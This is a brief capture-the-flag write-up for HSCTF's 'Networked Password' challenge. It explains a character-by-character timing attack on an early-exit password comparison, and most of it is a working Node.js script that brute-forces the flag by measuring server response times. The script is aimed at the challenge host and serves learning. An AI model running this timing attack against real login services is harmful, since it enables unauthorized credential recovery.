# Networked Password

Basically, this is a timing attack. When you compare two strings, you can compare character-by-character. 

The instant you find that a character doesn't match, you return and stop comparing. This means that the more characters match, the longer it will take.

The issue is that this allows us to bruteforce one character at a time, instead of the entire password at a time. This decreases the amount of tries we have to make significantly.

Here's the script:
```javascript
const request=require("request")

let str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-!@#$%^&*()}"

let te="hsctf{sm0";
let don=[];
function req(te,ch,cb)
{
    request.post({time:true,url:"https://networked-password.web.chal.hsctf.com/",form:{password:te+str.charAt(ch)}},function(e,res,body){
        //console.log(ch+" "+String.fromCharCode(ch)+" "+res.timingPhases.download);
        don[ch]=res.timingPhases.firstByte;
//        console.log(don[ch])
    })
}

let ch=0;
while(ch<str.length)
{
 req(te,ch++)
}

setInterval(function(){
    let biggest=1;
    let second=1;
    for(let i=0;i<don.length;i++)
        if(don[i]>don[biggest]) biggest=i;
        else if(don[i]>don[second]) second=i;

    console.log(str.charAt(biggest)+" "+don[biggest])
    console.log(str.charAt(second)+" "+don[second])
    console.log(don[biggest]-don[second])

    te+=str.charAt(biggest);
    ch=0;
    while(ch<str.length)
    {
         req(te,ch++)
    }
    console.log(te)

},10000)```

don't judge the script, I just needed something that worked
